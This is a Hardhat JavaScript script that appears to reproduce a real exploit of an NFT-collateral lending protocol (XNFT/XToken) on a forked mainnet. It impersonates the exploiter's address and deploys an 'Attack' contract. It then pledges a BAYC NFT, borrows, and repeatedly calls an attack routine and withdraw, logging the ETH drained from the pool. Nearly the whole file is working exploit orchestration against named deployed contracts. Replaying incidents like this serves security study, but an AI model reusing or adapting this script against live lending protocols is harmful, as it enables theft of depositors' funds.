const _ = require('lodash');
const hre = require("hardhat");

const exploiter = "0xb7cbb4d43f1e08327a90b32a8417688c9d0b800a";

const addr_proxy_xtoken = "0xb38707e31c813f832ef71c70731ed80b45b85b2d"; // EIP-1967, TransparentUpgradeableProxy
// const addr_xtoken = "0x5417da20ac8157dd5c07230cfc2b226fdcfc5663"; // XToken
// contracts/0x5417da20ac8157dd5c07230cfc2b226fdcfc5663_XToken/01_12_XToken.sol
const addr_interest_rate_model = "0xbd0e1bc09ae52072a9f5d3343b98643ae585e339";
// contracts/0xbd0e1bc09ae52072a9f5d3343b98643ae585e339_JumpRateModelV2/01_04_JumpRateModelV2.sol

// const addr_proxy_controller = "0xb7e2300e77d81336307e36ce68d6909e43f4d38a";
// const addr_controller = "0x34ca24ddcdaf00105a3bf10ba5aae67953178b85"; // Controller
// contracts/0x34ca24ddcdaf00105a3bf10ba5aae67953178b85_P2Controller/01_13_P2Controller.sol

const addr_proxy_xnft = "0xb14b3b9682990ccc16f52eb04146c3ceab01169a";
// const addr_xnft = "0x39360ac1239a0b98cb8076d4135d0f72b7fd9909"; // xNFT
// contracts/0x39360ac1239a0b98cb8076d4135d0f72b7fd9909_XNFT/01_20_XNFT.sol

// const addr_proxy_xairdrop = "0xbe6f91cd3795eb9e2b9294806569342157388049";
// const addr_xairdrop = "0x5b7e34db8779489c1d81d66771b59cde67210f62"; // xAirDrop
// contracts/0x5b7e34db8779489c1d81d66771b59cde67210f62_XAirDrop/01_12_XAirDrop.sol

const players = [
  {name: "exploiter", addr: "0xb7cbb4d43f1e08327a90b32a8417688c9d0b800a", id: "exploiter"},
  {name: "xToken admin", addr: "0x6d7bc3d418e8c482c49f6c1ebad901606d9c10a4", id: "xtokenAdmin"},
  {name: "Interest model admin", addr: "0x6d7bc3d418e8c482c49f6c1ebad901606d9c10a4", id: "modelAdmin"},
  {name: "Controller admin", addr: "0x6d7bc3d418e8c482c49f6c1ebad901606d9c10a4", id: "controllerAdmin"},
  {name: "xNFT admin", addr: "0x6d7bc3d418e8c482c49f6c1ebad901606d9c10a4", id: "xnftAdmin"},
  {name: "xAirDrop admin", addr: "0xc087629431256745e6e3d87b3ec14e8b42d47e48", id: "xairdropAdmin"},
];

function playerById(id){
  return _.find(players, p=>p.id==id)
}

function toEther(bn){
  return ethers.utils.formatEther(bn);
}

async function printBalances(){
  for (const player of players){
    const addr = player.addr;
    const name = player.name;
    const balance = await ethers.provider.getBalance(addr);
    console.log(name, addr, "balance:", toEther(balance), "ETH");
  }  
}

async function main() {
  await printBalances();

  // Unlock exploiter address
  await hre.network.provider.request({
    method: "hardhat_impersonateAccount",
    params: [exploiter],
  });



  const XToken = await ethers.getContractFactory("XToken");
  const xTokenAdmin = playerById("xtokenAdmin");
  const exploiterSigner = await ethers.getSigner(exploiter);
  const xtoken = await XToken.attach(addr_proxy_xtoken).connect(exploiterSigner);

  console.log("XToken address:", xtoken.address);
  console.log("Total XToken borrows:", toEther(await xtoken.totalBorrows()));
  console.log("Total XToken cash:", toEther(await xtoken.totalCash()));
  console.log("Total XToken reserves:", toEther(await xtoken.totalReserves()));


  const XNFT = await ethers.getContractFactory("XNFT");
  const xnft = await XNFT.attach(addr_proxy_xnft).connect(exploiterSigner);


  // https://etherscan.io/tx/0x4ca2eda6eb882d90f92cf2b77f6292adb6c76578f75c988d224214df9ec78c2c
  
  const tokenId = 5110;
  const collectionAddr = "0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d"; // BAYC

  const punksAddr = await xnft.punks();
  console.log("Punks address", punksAddr);

  const wrappedPunksAddr = await xnft.wrappedPunks();
  console.log("WrappedPunks address", wrappedPunksAddr);

  // https://hardhat.org/hardhat-runner/plugins/nomiclabs-hardhat-ethers#helpers
  // Get interface contract by deployed address
  // Hacker owns BAYC NFT 5110 
  const bayc = await ethers.getContractAt("IERC721Upgradeable", collectionAddr, exploiterSigner);
  const owner = await bayc.ownerOf(tokenId);
  console.log("Owner of", tokenId, "in collection", collectionAddr, "is", owner);

  let orderId = 0;
  
  const factory = await ethers.getContractFactory("Attack", exploiterSigner);
  const attacker = await factory.deploy(xnft.address, xtoken.address, collectionAddr, tokenId, ethers.utils.parseEther("30"));
  await attacker.deployed();

  const attackerAddr = attacker.address;

  console.log("Attacker deployed to", attackerAddr);

  await bayc.approve(xnft.address, tokenId);
  await bayc.approve(attackerAddr, tokenId);
  console.log("Approve done");

  console.log("transferFrom args:", exploiter, attackerAddr, tokenId )
  await bayc.transferFrom(exploiter, attackerAddr, tokenId);
  console.log("Transfer done");

  
  await attacker.pledge();
  console.log("Pledge done");
  const filterPledgeEvent = xnft.filters.Pledge();
  const events = await xnft.queryFilter(filterPledgeEvent, -1); // Get events from last block
  orderId = _.last(events).args[2];
  console.log("Order Id after pledge:", orderId);

  await attacker.borrow(orderId);
  // await attacker.withdraw();

  // We can also get orderId from event log
  orderId = orderId.add(1);

  await attacker.attack(orderId, 50);
  await attacker.withdraw();

  console.log("Exploiter balance:", toEther(await ethers.provider.getBalance(exploiter)), "ETH");
  console.log("XToken total cash:", toEther(await xtoken.totalCash()));


  
    
  
  // await printBalances();
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
